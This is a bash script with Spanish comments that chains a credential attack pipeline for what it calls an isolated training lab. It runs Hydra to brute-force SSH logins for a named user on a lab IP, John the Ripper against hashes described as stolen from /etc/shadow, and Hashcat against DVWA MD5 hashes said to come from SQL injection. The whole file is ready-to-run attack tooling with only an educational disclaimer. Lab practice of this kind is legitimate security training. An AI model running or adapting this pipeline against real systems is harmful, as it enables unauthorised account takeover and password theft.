#!/usr/bin/env bash
# crackeo.sh - pipeline de ataque a credenciales en el laboratorio AISLADO de Morini.
#   [1] Hydra   : fuerza bruta ONLINE de la clave SSH de un usuario enumerado.
#   [2] John    : crackea OFFLINE el hash del sistema (/etc/shadow) robado.
#   [3] Hashcat : crackea OFFLINE los hashes MD5 de la web (DVWA) robados por SQLi.
# Encadena lo mismo que hicimos a mano, en una sola orden. Solo lab propio; fines educativos.
set -u
VICTIMA="${1:-10.13.37.20}"
DIC=/root/diccionario.txt
# empezar limpio: vacia el "bote" de John para que vuelva a crackear de verdad
rm -f /root/.john/john.pot 2>/dev/null

echo "=== [1/3] HYDRA - fuerza bruta ONLINE (SSH ${VICTIMA}) ==="
hydra -l soporte -P "$DIC" -t 4 -f "ssh://${VICTIMA}" 2>/dev/null | grep -E "login:|host:"

echo
echo "=== [2/3] JOHN - hash del sistema /etc/shadow (OFFLINE) ==="
john --wordlist="$DIC" /root/hashes_sistema.txt 2>/dev/null >/dev/null
john --show /root/hashes_sistema.txt

echo
echo "=== [3/3] HASHCAT - hashes MD5 de la web DVWA (OFFLINE) ==="
hashcat -m 0 -a 0 /root/dvwa_hashes.txt "$DIC" --force --potfile-disable --quiet

echo
echo "=== fin del ataque a credenciales ==="
